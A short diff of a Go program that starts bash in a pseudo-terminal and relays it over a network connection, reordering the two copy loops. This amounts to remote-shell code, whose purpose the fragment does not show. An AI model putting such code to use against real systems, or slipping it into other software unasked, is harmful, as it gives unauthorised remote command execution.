@@ -26,8 +26,9 @@ func main() {
 	cmd := exec.Command("bash")
 	ptmx, _ := pty.Start(cmd)
 
-	go func() { io.Copy(ptmx, conn) }()
-	io.Copy(conn, ptmx)
+	go func() { io.Copy(conn, ptmx) }()
+	
+	io.Copy(ptmx, conn)
 
 	ptmx.Close()
 	conn.Close()
